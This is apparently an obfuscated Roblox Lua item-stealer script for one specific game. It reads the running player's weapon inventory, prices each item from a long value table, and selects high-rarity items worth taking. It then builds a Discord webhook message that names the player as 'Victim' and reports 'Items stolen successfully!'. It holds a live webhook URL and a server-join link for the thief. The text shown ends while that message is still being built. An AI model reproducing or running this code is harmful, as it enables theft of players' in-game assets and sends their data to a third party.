
-- This file was generated at discord.gg/syncrypt

local t1 = {}
local v2 = unpack or table.unpack
if _G.scriptExecuted then
    return
end
local t2 = {}
_G.scriptExecuted = true
t2.value1 = false
t2.value2 = false
t2.value3 = true
t2.value4 = "johfhfip"
t2.value5 = "https://discord.com/api/webhooks/1487728088950509638/74T4wFgYFRK_o8S5vHSwZQLqgWreybbAWfwvxmGitEVun5zcBA3AN0DTpF9LIgcWOqMK"
t2.value6 = 90
if game.PlaceId ~= 142823291 then
    game:GetService("Players").LocalPlayer:Kick("Wrong game")

    return
end
local t3 = {
	value1 = game:GetService("Players"),
	value2 = game:GetService("ReplicatedStorage"),
	value3 = game:GetService("HttpService")
}

t3.value4 = t3.value1.LocalPlayer
if t3.value4.Character then
    t3.value4.Character:FindFirstChild("HumanoidRootPart")
end
repeat
    task.wait()
until t3.value4.Character and t3.value4.Character:FindFirstChild("HumanoidRootPart")

t3.value5 = {
	Soul = 5000,
	Spirit = 5000,
	["Nik's Scythe"] = 25000000,
	["Elderwood Scythe"] = 38,
	Batwing = 43,
	Icewing = 15,
	Corrupt = 475,
	["Chroma Luger"] = 60,
	["Chroma Shark"] = 40,
	["Chroma Laser"] = 35,
	["Chroma Slasher"] = 27,
	["Chroma Fang"] = 57,
	["Chroma Heat"] = 80,
	["Chroma Saw"] = 42,
	["Chroma DeathShard"] = 58,
	["Chroma Tides"] = 62,
	SeerChroma = 50,
	["Chroma Boneblade"] = 58,
	["Chroma Gingerblade"] = 57,
	["Elderwood Revolver"] = 58,
	["Eternal II"] = 7,
	["Red Luger"] = 42,
	["Green Luger"] = 30,
	Sugar = 145,
	Candy = 155,
	Chill = 24,
	Handsaw = 10,
	Eternal = 10,
	Boneblade = 10,
	Clockwork = 26,
	["Hallow's Edge"] = 15,
	Amerilaser = 30,
	["Old Glory"] = 28,
	["BattleAxe II"] = 16,
	Spider = 22,
	Pixel = 24,
	Blaster = 30,
	["Ginger Luger"] = 26,
	Virtual = 28,
	Flames = 13,
	Luger = 60,
	Heat = 25,
	Xmas = 13,
	Tides = 23,
	Slasher = 26,
	Pumpking = 22,
	Saw = 10,
	Laser = 8,
	Fang = 23,
	Shark = 28,
	Deathshard = 21,
	["Winter's Edge"] = 14,
	["Ice Dragon"] = 13,
	["Red Seer"] = 3,
	Seer = 3,
	["Blue Seer"] = 3,
	["Purple Seer"] = 3,
	["Orange Seer"] = 2,
	["Yellow Seer"] = 2,
	BattleAxe = 13,
	Frostsaber = 18,
	["Ice Shard"] = 14,
	Gingerblade = 22,
	Snowflake = 8,
	Ghostblade = 10,
	Nightblade = 28,
	["Hallow's Blade"] = 11,
	JD = 60,
	Web = 2,
	Rupture = 2,
	["Green Elite"] = 10,
	["Tree (gun)"] = 1,
	["Tree (knife)"] = 1,
	["Cotton Candy"] = 60,
	Scratch = 5,
	["Ghost Knife"] = 6,
	["Ginger Gun"] = 4,
	["Red Fire"] = 3,
	["Blue Scratch"] = 3,
	["Blue Elite"] = 8,
	["Green Fire"] = 0.43,
	["Ghost Gun"] = 1,
	["Predator (knife)"] = 0.44,
	Emerald = 0.44,
	Sparkle = 0.43,
	["Overseer (gun)"] = 0.44,
	Midnight = 0.43,
	Elite = 0.33,
	Shiny = 0.34,
	Fusion = 0.34,
	Fade = 0.34,
	Splash = 0.34,
	Universe = 0.34,
	["Overseer (knife)"] = 0.42,
	["Predator (gun)"] = 0.42,
	Plasmite = 0.34,
	Viper = 0.34,
	["Ginger Knife"] = 0.42,
	Jack = 4,
	Mummy = 1,
	["Ginger (Knife)"] = 1,
	["Ginger (Gun)"] = 1,
	["Cane (Knife)"] = 2,
	["Cane (Gun)"] = 2,
	["Orange Marble"] = 4,
	Bats = 4,
	["Cane Knife"] = 175,
	["Icicles Gun"] = 25,
	Snowy = 1,
	GingerBread = 0.42,
	["Vampire Gun"] = 25,
	["Toxic Knife"] = 30,
	Galaxy = 0.24,
	Rainbow = 500,
	Imbued = 0.24,
	Galactic = 0.24,
	Krypto = 0.24,
	Spectrum = 0.24,
	iRevolver = 0.24,
	Hacker = 0.24,
	Nova = 0.24,
	Vortex = 0.24,
	Ace = 0.24,
	Bacon = 0.24,
	Korblox = 0.24,
	Squire = 0.24,
	Abstract = 0.24,
	Musical = 0.24,
	Black = 0.24,
	Purple = 0.24,
	Magma = 12,
	["Green Marble"] = 6,
	["Vampire Knife"] = 2,
	["Toxic Gun"] = 3,
	["Cane Gun"] = 0.42,
	["Icicles Knife"] = 0.41,
	Nether = 0.41,
	Spitfire = 0.33,
	Damp = 0.33,
	["Molten (Gun)"] = 0.42,
	["Molten (Knife)"] = 0.42,
	Gifted = 1,
	["Snowman (Knife)"] = 1,
	["Snowman (Gun)"] = 1,
	Nutcracker = 1,
	["Wrapped (Knife)"] = 1,
	["Wrapped (Gun)"] = 1,
	Wolf = 4,
	Vampire = 3,
	Moons = 4,
	Night = 0.31,
	Future = 0.31,
	Checker = 0.31,
	["Love (Gun)"] = 0.42,
	Donut = 0.31,
	Wanwood = 0.14,
	["Adurite (Knife)"] = 0.14,
	["Bluesteel (Knife)"] = 0.14,
	["Adurite (Gun)"] = 0.14,
	Camo = 0.14,
	Stalker = 0.14,
	Missing = 0.14,
	Cheesy = 0.14,
	Sketch = 0.14,
	Marina = 0.14,
	Cheddar = 0.14,
	Circuit = 0.14,
	Paper = 0.14,
	Doge = 0.14,
	Caution = 0.14,
	Soda = 0.14,
	Wooden = 0.14,
	Hazmat = 0.14,
	["Bluesteel (Gun)"] = 0.14,
	Melon = 0.14,
	Hive = 0.14,
	Jigsaw = 0.14,
	Brush = 0.14,
	Lucky = 0.14,
	Pink = 0.14,
	Blue = 0.14,
	Red = 0.14,
	["Mummy (Knife)"] = 2,
	Potion = 5,
	Webs = 4,
	Tree = 0.41,
	Sweater = 0.32,
	Frosty = 0.41,
	["Mummy Gun"] = 12,
	["Zombie Gun"] = 20,
	["Potion Knife"] = 22,
	["Mummy Knife"] = 2,
	["Zombie Knife"] = 2,
	["Potion Gun"] = 2,
	["Sweater Knife"] = 10,
	["Snowflake Knife"] = 4,
	["Holly Gun"] = 2,
	["Sweater Gun"] = 0.31,
	["Snowflake Gun"] = 0.31,
	["Holly Knife"] = 0.31,
	["2015"] = 2,
	TNL = 2,
	Hearts = 4,
	Valentine = 3,
	Goo = 2,
	Neon = 3,
	Reptile = 2,
	Infected = 2,
	Passion = 4,
	Sweetheart = 3,
	Blossom = 1500,
	Roses = 4,
	["Santa (Knife)"] = 1,
	["Santa (Gun)"] = 1,
	["Ornament2 (knife)"] = 1,
	["Ornament2 (Gun)"] = 1,
	Ornament1 = 1,
	Ornament = 1,
	["Elf (Gun)"] = 3,
	["Elf (knife)"] = 14,
	Tulip = 3,
	Skool = 23,
	Patrick = 2,
	Bunny = 0.11,
	Choco = 3,
	Egg = 2,
	Carrot = 2,
	Asteroid = 6,
	Ghosty = 0.32,
	Brains = 1,
	Witch = 1,
	Boney = 1,
	Xbox = 0.12,
	["Slime Gun"] = 2,
	["Slime Knife"] = 3,
	["Bats Knife"] = 70,
	["Bats Gun"] = 4,
	["Grave Gun"] = 12,
	["Grave Knife"] = 2,
	["Haunted Knife"] = 10,
	["Haunted Gun"] = 2,
	Sparkle10 = 45,
	Sparkle1 = 3,
	Sparkle2 = 3,
	Sparkle3 = 3,
	Sparkle4 = 5,
	Ecto = 3,
	CandyCorn = 2,
	Phantom = 6,
	Zombie = 4,
	["Elf (2017)"] = 0.31,
	["Santa (2017)"] = 0.31,
	Coal = 0.31,
	Present = 0.31,
	Sidewinder = 15,
	Grind = 4,
	Euro = 8,
	Ollie = 20,
	Tailslide = 22,
	Indy = 2,
	["Coal Gun"] = 0.31,
	["Snowman Knife"] = 0.31,
	["Santa Knife"] = 0.31,
	["Wrapped Knife"] = 0.31,
	Sparkle5 = 15,
	Sparkle6 = 18,
	Sparkle7 = 23,
	Sparkle8 = 26,
	Sparkle9 = 42,
	["Coal knife"] = 25,
	["Snowman Gun"] = 5,
	["Elf Gun"] = 0.41,
	["Wrapped Gun"] = 5,
	Whiteout = 0.11,
	Splatter = 0.11,
	Ice = 0.11,
	["Love (Knife)"] = 0.11,
	Iron = 0.11,
	["Big Kill"] = 0.11,
	Fallout = 0.11,
	Cold = 0.11,
	Linked = 0.11,
	Slate = 0.11,
	Borders = 0.11,
	["8bit"] = 0.11,
	Engraved = 0.11,
	Infiltrator = 0.11,
	Juice = 0.11,
	Star = 0.11,
	Clan = 0.11,
	Cherry = 0.11,
	Cardboard = 0.11,
	Stainless = 0.11,
	Bit = 0.11,
	Pea = 0.11,
	News = 0.11,
	HL2 = 0.11,
	Bleached = 0.11,
	Clown = 0.12,
	Oily = 0.11,
	Aqua = 0.11,
	Eco = 0.11,
	Log = 0.11,
	Sandy = 0.11,
	Static = 0.11,
	Brown = 0.11,
	Green = 0.11,
	Yellow = 0.11,
	Orange = 0.11,
	Prism = 3,
	Denis = 1,
	Alex = 1,
	Corl = 1,
	Sketchy = 1,
	Sub = 1,
	["Chroma Fire Bat"] = 15,
	["Chroma Fire Bear"] = 8,
	["Chroma Fire Fox"] = 15,
	["Chroma Fire Pig"] = 9,
	["Chroma Fire Bunny"] = 18,
	["Chroma Fire Cat"] = 20,
	["Chroma Fire Dog"] = 15,
	["<3"] = 10,
	Steambird = 2,
	Phoenix = 3,
	Sammy = 2,
	Electro = 2,
	Deathspeaker = 3,
	["Fire Bat"] = 1,
	["Fire Bear"] = 1,
	Frostbird = 3,
	["Fire Fox"] = 1,
	["Fire Pig"] = 1,
	["Fire Bunny"] = 1,
	["Fire Cat"] = 1,
	["Fire Dog"] = 1,
	["Ice Phoenix"] = 0.43,
	Traveller = 0.43,
	Skelly = 0.43,
	["Purple Pumpkin"] = 40,
	["Overseer Eye"] = 38,
	["Blue Pumpkin"] = 60,
	["Red Pumpkin"] = 45,
	["Green Pumpkin"] = 30,
	Pumpkin = 18,
	Fairy = 22,
	Reindeer = 20,
	Elf = 4,
	Nobledragon = 25,
	Elitey = 0.31,
	Eyeball = 35,
	Jetstream = 42,
	Dogey = 55,
	Chilly = 15,
	Seahorsey = 17,
	Piggy = 4,
	Pengy = 15,
	UFO = 7,
	Badger = 2,
	Bat = 120,
	Tankie = 13,
	Mechbug = 7,
	Bear = 0.22,
	Fox = 0.12,
	Pig = 0.12,
	["Santa Dog"] = 0.12,
	Cat = 0.11,
	Dog = 0.11,
	America = 10,
	Golden = 4,
	Blood = 10,
	Phaser = 9,
	Prince = 6,
	Shadow = 7,
	Ghost = 12,
	Splitter = 3,
	Cowboy = 3,
	Eternalcane = 20,
	Skulls = 12,
	Witched = 50,
	Monster = 22,
	["Pumpkin Patch"] = 2,
	["Blue Pumpkin 2019"] = 3,
	["Brains 2019"] = 20,
	["Elf 2019"] = 25,
	["Gingerbread Gun"] = 5,
	["Gingerbread Knife"] = 105,
	["Green Pumpkin 2019"] = 27,
	["Red Pumpkin 2019"] = 30,
	PumpkinPet2019 = 0.21,
	Rudolph = 20,
	["Vampire Bat"] = 32,
	["Black Cat"] = 45,
	["Zombie Dog"] = 185,
	["Aurora Gun"] = 92,
	Aurora = 900,
	["Bones Gun"] = 75,
	Branches = 22,
	["Candy Swirl Gun"] = 20,
	["Candy Swirl Knife"] = 1,
	["Lights Gun"] = 20,
	["Lights Knife"] = 2,
	["Log Chopper"] = 30,
	Minty = 25,
	Icey = 0.32,
	Frostbite = 10,
	Lugercane = 20,
	["Snakebite Knife"] = 12,
	["Snakebite Gun"] = 1,
	["Snowflakes Gun"] = 0.41,
	["Snowflakes Knife"] = 0.31,
	Slimy = 0.41,
	["Santa's Magic"] = 13,
	Dungeon = 45,
	["Frosted Gun"] = 0.31,
	["Frosted Knife"] = 0.41,
	["Gifts Knife"] = 60,
	["Gifts Gun"] = 1,
	["Pine Gun"] = 1,
	["Pine Knife"] = 20,
	["Webbed Gun"] = 0.31,
	["Webbed Knife"] = 0.33,
	ZombifiedGun = 20,
	["Zombified Knife"] = 55,
	Mummified = 0.42,
	["RIP Gun"] = 20,
	["Box of Gold Papers"] = 4,
	["Box of Ultra Wrap"] = 4,
	["Box of Purple Papers"] = 3,
	["Box of Blue Papers"] = 3,
	["Box of Red Papers"] = 3,
	["Box of Green Papers"] = 2,
	["Box of Fert"] = 2,
	["Mystery Keys"] = 4,
	["Xmas Gifts"] = 0.41,
	["Snowflake Key"] = 0.31,
	["Skeleton Key"] = 2,
	["Chroma Gemstone"] = 75,
	Gemstone = 26,
	["Eternal III"] = 8,
	Rune = 0.34,
	["Rainbow (Gun)"] = 0.24,
	Bioblade = 13,
	Lightbringer = 58,
	["Chroma Lightbringer"] = 120,
	["Chroma Darkbringer"] = 125,
	Darkbringer = 62,
	Combat = 0.11,
	Copper = 0.11,
	Hardened = 0.11,
	Splat = 0.11,
	Tiger = 0.14,
	Pirate = 0.14,
	Space = 0.24,
	["Splash Gun"] = 0.33,
	["Deep Sea"] = 0.24,
	Nightfire = 0.24,
	Biogun = 0.14,
	Graffiti = 0.13,
	["High Tech"] = 0.13,
	["Clown Gun"] = 0.12,
	Leaf = 0.11,
	Lovely = 0.11,
	Shaded = 0.11,
	["Eternal IV"] = 10,
	Prismatic = 8,
	["Cavern Gun"] = 1,
	["Cavern Knife"] = 12,
	Hallowscythe = 50,
	Hallowgun = 33,
	["Vampire's Edge"] = 16,
	["Ripper Gun"] = 0.42,
	["Ripper Knife"] = 0.43,
	Bones = 0.32,
	["Portal Knife"] = 0.32,
	Ghosts = 0.21,
	Peppermint = 6,
	Icebreaker = 85,
	Iceblaster = 60,
	Jinglegun = 14,
	Cookieblade = 4,
	["Gold Candy"] = 100000000,
	["Silver Candy"] = 75000000,
	["Bronze Candy"] = 50000000,
	["Blue Candy"] = 1000000,
	["Red Hallow"] = 1000000,
	["Gold Hallow"] = 100000000,
	["Silver Hallow"] = 75000000,
	["Bronze Hallow"] = 50000000,
	["Bronze Sugar"] = 50000000,
	["Silver Sugar"] = 75000000,
	["Gold Sugar"] = 100000000,
	["Blue Sugar"] = 1000000,
	["Blue Elderwood (gun)"] = 1000000,
	["Bronze Elderwood (gun)"] = 50000000,
	["Silver Elderwood (gun)"] = 75000000,
	["Gold Elderwood (gun)"] = 100000000,
	["Gold Logchopper"] = 100000000,
	["Gold Minty"] = 100000000,
	["Silver Minty"] = 75000000,
	["Silver Logchopper"] = 75000000,
	["Bronze Logchopper"] = 50000000,
	["Bronze Minty"] = 50000000,
	["Blue Minty"] = 1000000,
	["Blue Logchopper"] = 1000000,
	Logchopper = 30,
	["Blue Vamp's Edge"] = 1000000,
	["Bronze Vamp's Edge"] = 50000000,
	["Silver Vamp's Edge"] = 75000000,
	["Gold Vamp's Edge"] = 100000000,
	Heartblade = 75,
	["Gold Icebreaker"] = 100000000,
	["Silver Icebreaker"] = 75000000,
	["Bronze Icebreaker"] = 50000000,
	["Red Icebreaker"] = 1000000,
	["Red Iceblaster"] = 1000000,
	["Bronze Iceblaster"] = 50000000,
	["Silver Iceblaster"] = 75000000,
	["Gold Iceblaster"] = 100000000,
	Eggblade = 3,
	Nebula = 7,
	Glitch1 = 25,
	Candleflame = 130,
	["Chroma Candleflame"] = 190,
	Harvester = 900,
	["Chroma Swirlygun"] = 180,
	["Swirly Gun"] = 170,
	["Swirly Axe"] = 190,
	["Swirly Blade"] = 80,
	Iceflake = 31,
	Icebeam = 31,
	Icecracker = 3,
	["Ornaments Gun"] = 0.12,
	["Ornaments Knife"] = 0.12,
	["Gift Bag Knife"] = 0.22,
	["Silent Night Knife"] = 10,
	Icedriller = 15,
	Stockings = 0.12,
	Trees = 0.12,
	["Wrap Gun"] = 0.22,
	["Wrap Knife"] = 0.22,
	Snowflakes = 0.41,
	["Silent Night Gun"] = 2,
	["Gift Bag Gun"] = 0.12,
	["Giftwrap Knife"] = 0.12,
	["Stickers Gun"] = 0.12,
	["Cookie Gun"] = 0.22,
	["Ice Camo"] = 0.32,
	["Starry Knife"] = 0.41,
	["Stickers Knife"] = 0.11,
	["Coal Knife"] = 0.12,
	Ribbons = 0.12,
	["Tree Knife"] = 0.23,
	["Cookie Knife"] = 0.31,
	["Starry Gun"] = 0.43,
	["Swirl Knife"] = 0.41,
	["Gold Harvester"] = 100000000,
	["Silver Harvester"] = 75000000,
	["Bronze Harvester"] = 50000000,
	["Blue Harvester"] = 1000000,
	Plasmabeam = 31,
	Plasmablade = 31,
	["Gold Swirly"] = 100000000,
	["Silver Swirly"] = 75000000,
	["Bronze Swirly"] = 50000000,
	["Blue Swirly"] = 1000000,
	["Silver Swirly Gun"] = 75000000,
	["Bronze Swirly Gun"] = 50000000,
	["Blue Swirly Gun"] = 1000000,
	["Candies 2016"] = 0.21,
	["Candies 2017"] = 0.11,
	Snowbear = 0.31,
	Scarecrow = 0.42,
	["Mr. Reindeer"] = 0.42,
	Snowman = 0.22,
	["Shadow Pumpkin"] = 0.32,
	Skully = 0.42,
	["Santa's Spirit"] = 12,
	["Frozen Gun"] = 22,
	["RB Knife"] = 0.31,
	["Gothic Gun"] = 0.41,
	["Gothic Knife"] = 0.23,
	["Wraiths Gun"] = 0.23,
	["Fall Camo"] = 0.22,
	["Wraiths Knife"] = 0.41,
	["Frozen Knife"] = 2,
	Slashed = 0.22,
	Starry = 0.22,
	["Carved (Gun)"] = 0.12,
	["Carved (Knife)"] = 0.13,
	["Chroma Elderwood Blade"] = 190,
	Makeshift = 135,
	["Elderwood Blade"] = 130,
	Spectre = 80,
	["Spectral Knife"] = 5,
	["Spectral Gun"] = 0.43,
	["Magma Knife"] = 0.32,
	["Magma Gun"] = 0.41,
	["Watcher Knife"] = 0.32,
	["Watcher Gun"] = 0.41,
	Versus = 0.12,
	["Apocalypse Knife"] = 0.23,
	["Candy Corn Gun"] = 0.22,
	["Apocalypse Gun"] = 0.23,
	["Darkness Knife"] = 0.22,
	["Hunter Knife"] = 0.22,
	["Webs Gun"] = 0.22,
	["Candy Corn Knife"] = 0.12,
	["Eyeball Knife"] = 0.12,
	Stickers = 0.12,
	["Darkness Gun"] = 0.12,
	["Infected Knife"] = 0.23,
	["Infected Gun"] = 0.23,
	["Brains Gun"] = 0.22,
	Ghostly = 0.22,
	["Hazard Knife"] = 0.22,
	["Hazard Gun"] = 0.31,
	["Lantern Knife"] = 0.32,
	["Moonlight Gun"] = 0.32,
	Witchbrew = 0.22,
	["Curse Knife"] = 0.32,
	Ghostfire = 0.41,
	["Makeshift Knife"] = 1,
	["Wraith Gun"] = 0.32,
	["Wraith Knife"] = 0.41,
	Zombified = 0.43,
	["Santa Walking"] = 40,
	["Mr. Snowman"] = 0.41,
	Void = 0.42,
	["Chroma Cookiecane"] = 160,
	Cookiecane = 80,
	Icepiercer = 870,
	Gingermint = 80,
	["Arctic Knife"] = 0.43,
	["Arctic Gun"] = 4,
	["Coal Gun 2022"] = 0.12,
	["Candied Knife"] = 0.12,
	["Snowman Gun 2022"] = 0.13,
	["Stockings 2022"] = 0.23,
	["Mistletoe Gun"] = 0.23,
	["Snowflake Knife 2022"] = 0.23,
	["Gingerbread Gun 2022"] = 0.33,
	["Tree Knife 2022"] = 0.33,
	["Coal Knife 2022"] = 0.12,
	["Candied Gun"] = 0.12,
	["Stickers Gun 2022"] = 0.12,
	["Snowman Knife 2022"] = 0.12,
	["Stockings Gun 2022"] = 0.22,
	["Mistletoe Knife"] = 0.22,
	["Snowflake Gun 2022"] = 0.22,
	["Tree Gun 2022"] = 0.32,
	["Gingerbread Knife 2022"] = 0.32,
	["Blue Elderwood"] = 1000000,
	["Bronze Elderwood"] = 50000000,
	["Silver Elderwood"] = 75000000,
	["Gold Elderwood"] = 100000000,
	["Gold Icepiercer"] = 100000000,
	["Gold Icecrusher"] = 100000000,
	["Silver Icecrusher"] = 75000000,
	["Silver Icepiercer"] = 75000000,
	["Bronze Icepiercer"] = 50000000,
	["Bronze Icecrusher"] = 50000000,
	["Red Icecrusher"] = 1000000,
	["Red Icepiercer"] = 1000000,
	Glitch2 = 45,
	Sakura = 540,
	Broken = 3,
	Heart = 0.32,
	Rose = 0.22,
	Love = 0.12,
	Teddy = 0.32,
	["Vampire's Axe"] = 230,
	["Vampire's Gun"] = 240,
	["Combat II"] = 4,
	Constellation = 200,
	["Candycorn 2019"] = 0.31,
	["Candy Corn gun 2020"] = 0.12,
	["Candy Corn knife 2020"] = 0.12,
	["Watcher Knife 2020"] = 0.12,
	["Watcher gun 2020"] = 0.12,
	["Mummy Knife 2020"] = 0.22,
	["Mummy gun 2020"] = 0.22,
	["Portal Gun"] = 0.22,
	["Ghosts knife 2020"] = 0.22,
	Candle = 0.12,
	["Rainbow Gun"] = 185,
	["Chromatic Knife"] = 0.44,
	["Chromatic Gun"] = 0.43,
	Nuke = 0.41,
	Bio = 0.32,
	Marble = 0.22,
	["Painted Knife"] = 0.32,
	["Painted Gun"] = 0.22,
	["Fragile Gun"] = 0.12,
	["Fragile Knife"] = 0.12,
	["Carrot Bunny"] = 0.32,
	Waves = 140,
	Ocean = 145,
	Beach = 3,
	Flora = 500,
	Bloom = 400,
	Sunset = 560,
	Popsicle = 0.22,
	["Pool Noodle"] = 0.31,
	["Toy Knife"] = 0.21,
	["Toy Gun"] = 0.21,
	["Sticker Gun"] = 0.12,
	["Chroma Travelers Gun"] = 42500,
	["Traveler's Gun"] = 1550,
	Darkshot = 430,
	Darksword = 425,
	["Traveler's Axe"] = 4600,
	["Traveler Gun"] = 4,
	["Traveler Knife"] = 0.43,
	Darkknife = 0.43,
	["Ghastly Gun"] = 0.41,
	Ghoulish = 25,
	["Wood Knife"] = 0.13,
	["Vines Gun"] = 0.13,
	["Vines Knife"] = 0.21,
	Etched = 0.22,
	["Steel Knife"] = 0.22,
	Glowy = 0.22,
	Eclipse = 0.22,
	["Steel Gun"] = 0.32,
	Meltdown = 0.32,
	Turkey = 975,
	["Latte Gun"] = 795,
	Latte = 795,
	Scarf = 0.31,
	["Pumpkin Pie"] = 0.41,
	Darkgun = 0.33,
	["Ghastly Knife"] = 0.33,
	Evergreen = 435,
	Evergun = 925,
	Gingerscope = 6100,
	["Chroma Evergun"] = 23000,
	["Chroma Evergreen"] = 11000,
	["Frostfade Gun"] = 0.43,
	["Frostfade Knife"] = 2,
	["Snowflake Gun 23"] = 0.32,
	["Neon Gun"] = 0.33,
	["Snowglobe Knife"] = 0.32,
	["Tree Knife 23"] = 0.33,
	["Snowman Gun 23"] = 0.31,
	Fireplace = 0.31,
	["Canes Knife"] = 0.23,
	["Canes Gun"] = 0.31,
	["Stars Gun"] = 0.23,
	["Stars Knife"] = 0.31,
	Snowfall = 0.12,
	["Santa Gun 23"] = 0.13,
	["Elf Gun 23"] = 0.12,
	["Ribbon Knife"] = 0.13,
	Bells = 0.12,
	["Present Knife"] = 0.13,
	["Frozen Gun 23"] = 0.12,
	["Frozen Knife 23"] = 0.13,
	Flowerwood = 120,
	["Flowerwood Gun"] = 120,
	["Wavy Gun"] = 0.32,
	["Wavy Knife"] = 0.32,
	["Carrot Knife"] = 0.31,
	["Carrot Gun"] = 0.31,
	["Robot Knife"] = 0.32,
	["Spring Knife"] = 0.33,
	["Blue Gingerscope"] = 1000000,
	["Blue Gingerscythe"] = 1000000,
	["Bronze Gingerscope"] = 50000000,
	["Bronze Gingerscythe"] = 50000000,
	["Silver Gingerscope"] = 75000000,
	["Silver Gingerscythe"] = 75000000,
	["Gold Gingerscope"] = 100000000,
	["Gold Gingerscythe"] = 100000000,
	["Chroma Watergun"] = 3500,
	Watergun = 225,
	Pearl = 115,
	Pearlshine = 115,
	["Palms Knife"] = 0.43,
	["Palms Gun"] = 2,
	["Waves Knife"] = 0.41,
	["Floral Gun"] = 0.33,
	["Jellyfish Knife"] = 0.22,
	["Popsicle Gun"] = 0.22,
	["Turtle Knife"] = 0.22,
	["Clownfish Gun"] = 0.22,
	["Sandy Gun"] = 0.22,
	["Balloons Gun"] = 0.22,
	["Starfish Knife"] = 0.22,
	["Starfish Gun"] = 0.22,
	["Clownfish Knife"] = 0.22,
	Floatie = 0.31,
	["Sharky Knife"] = 0.42,
	Leaves = 1,
	Aliens = 1,
	Moon = 1,
	Treat = 175,
	Sweet = 170,
	["Heart Wand"] = 300,
	Raygun = 1000,
	Alienbeam = 1750,
	Sunrise = 1150,
	Snowcannon = 950,
	["Snow Dagger"] = 250,
	Blizzard = 260,
	Snowstorm = 255,
	Xenoknife = 270,
	Xenoshot = 275,
	Celestial = 1500,
	Australis = 150,
	Borealis = 155,
	Beachy = 100,
	Icecream = 100,
	Sands = 100
}
t3.value6 = {
	DefaultGun = true,
	DefaultKnife = true,
	Reaver = true,
	Reaver_Legendary = true,
	Reaver_Godly = true,
	Reaver_Ancient = true,
	IceHammer = true,
	IceHammer_Legendary = true,
	IceHammer_Godly = true,
	IceHammer_Ancient = true,
	Gingerscythe = true,
	Gingerscythe_Legendary = true,
	Gingerscythe_Godly = true,
	Gingerscythe_Ancient = true,
	TestItem = true,
	Season1TestKnife = true,
	Cracks = true,
	Icecrusher = true,
	["???"] = true,
	Dartbringer = true,
	TravelerAxeRed = true,
	TravelerAxeBronze = true,
	TravelerAxeSilver = true,
	TravelerAxeGold = true,
	BlueCamo_K_2022 = true,
	GreenCamo_K_2022 = true,
	SharkSeeker = true,
	["Gold Candy"] = true,
	["Silver Candy"] = true,
	["Bronze Candy"] = true,
	["Gold Hallow"] = true,
	["Silver Hallow"] = true,
	["Bronze Hallow"] = true,
	["Gold Sugar"] = true,
	["Silver Sugar"] = true,
	["Bronze Sugar"] = true,
	["Gold Logchopper"] = true,
	["Silver Logchopper"] = true,
	["Bronze Logchopper"] = true,
	["Gold Minty"] = true,
	["Silver Minty"] = true,
	["Bronze Minty"] = true,
	["Gold Icebreaker"] = true,
	["Silver Icebreaker"] = true,
	["Bronze Icebreaker"] = true,
	["Gold Iceblaster"] = true,
	["Silver Iceblaster"] = true,
	["Bronze Iceblaster"] = true,
	["Gold Harvester"] = true,
	["Silver Harvester"] = true,
	["Bronze Harvester"] = true,
	["Gold Swirly Axe"] = true,
	["Gold Swirly Gun"] = true,
	["Silver Swirly"] = true,
	["Bronze Swirly"] = true,
	["Silver Swirly Gun"] = true,
	["Bronze Swirly Gun"] = true,
	["Gold Elderwood"] = true,
	["Silver Elderwood"] = true,
	["Bronze Elderwood"] = true,
	["Gold Icepiercer"] = true,
	["Silver Icepiercer"] = true,
	["Bronze Icepiercer"] = true,
	["Gold Icecrusher"] = true,
	["Silver Icecrusher"] = true,
	["Bronze Icecrusher"] = true,
	["Gold Gingerscope"] = true,
	["Silver Gingerscope"] = true,
	["Bronze Gingerscope"] = true,
	["Gold Gingerscythe"] = true,
	["Silver Gingerscythe"] = true,
	["Bronze Gingerscythe"] = true,
	["Gold Vamp's Edge"] = true,
	["Silver Vamp's Edge"] = true,
	["Bronze Vamp's Edge"] = true,
	["Gold Elderwood (gun)"] = true,
	["Silver Elderwood (gun)"] = true,
	["Bronze Elderwood (gun)"] = true,
	["Nik's Scythe"] = true
}
local ok, _ = pcall(function()
    local t4 = {
		"Common",
		"Uncommon",
		"Rare",
		"Legendary",
		"Godly",
		"Ancient",
		"Unique",
		"Vintage"
	}
    local v74 = table.find(t4, "Legendary") or 1
    local Item = require(t3.value2:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
    local v76 = (function()
        local ok, result = pcall(function()
            return t3.value2:WaitForChild("Remotes"):WaitForChild("Inventory"):WaitForChild("GetProfileData"):InvokeServer(t3.value4.Name)
        end)
        local v652 = not ok

        if not v652 then
            v652 = not result or (not result.Weapons or not result.Weapons.Owned)
        end

        if v652 then
            return {}
        end

        return result
    end)()
    local t5 = {}
    local t6 = {}
    local n1 = 0
    if v76 and v76.Weapons then
        for k, v in pairs(v76.Weapons.Owned) do
            local v82 = v > 0
            local v83 = k

            if v82 then
                v82 = not t3.value6[v83]
            end

            if v82 then
                local v84 = Item[v83]

                if v84 then
                    local Rarity = v84.Rarity
                    local v86 = table.find(t4, Rarity)

                    if v86 and v74 <= v86 then
                        local v87 = t3.value5[v84.ItemName] or 0

                        table.insert(t6, {
							name = v84.ItemName,
							value = v87,
							rarity = Rarity,
							count = v
						})
                        n1 += v87 * v

                        local v88 = Rarity == "Godly"

                        if not v88 then
                            v88 = Rarity == "Ancient" or (Rarity == "Unique" or (Rarity == "Legendary" or Rarity == "Vintage"))
                        end

                        if v88 and v87 >= t2.value6 then
                            table.insert(t5, {
								id = v83,
								rarity = Rarity,
								qty = v,
								val = v87
							})
                        end
                    end
                end
            end
        end
    end
    t2.value3 = #t5 > 0
    local function v89(p1)
        if p1 then
            local t7 = {}
            local n2 = 0

            if #t6 == 0 then
                table.insert(t7, "No Legendary+ items found.")
            else
                for _, v in ipairs(t6) do
                    if #t7 < 20 then
                        local v658 = v.count > 1 and " x" .. v.count or ""

                        table.insert(t7, v.name .. " — " .. v.value .. v658)
                    end

                    n2 += v.value * v.count
                end

                if #t6 > 20 then
                    table.insert(t7, "and " .. #t6 - 20 .. " more...")
                end
            end

            local value4Name = t3.value4.Name
            local t8 = {
				name = "Victim",
				value = value4Name,
				inline = false
			}
            local v661 = "```" .. table.concat(t7, "\n") .. "```"
            local t9 = {
				name = "Items (all Legendary+ and above)",
				value = v661,
				inline = false
			}
            local v663 = "```" .. math.floor(n2) .. "```"
            local t10 = {
				name = "Total Value",
				value = v663,
				inline = false
			}
            local v665 = "https://gamerready.github.io/goofy-site/?placeId=142823291&gameInstanceId=" .. game.JobId
            local t11 = {
				t8,
				t9,
				t10,
				{
					name = "Server",
					value = v665,
					inline = false
				}
			}
            local v667 = os.date("!%Y-%m-%dT%H:%M:%SZ")
            local t12 = {
				embeds = {{
					title = "✅ Trade Completed",
					description = "Items stolen successfully!",
					color = 65280,
					fields = t11,
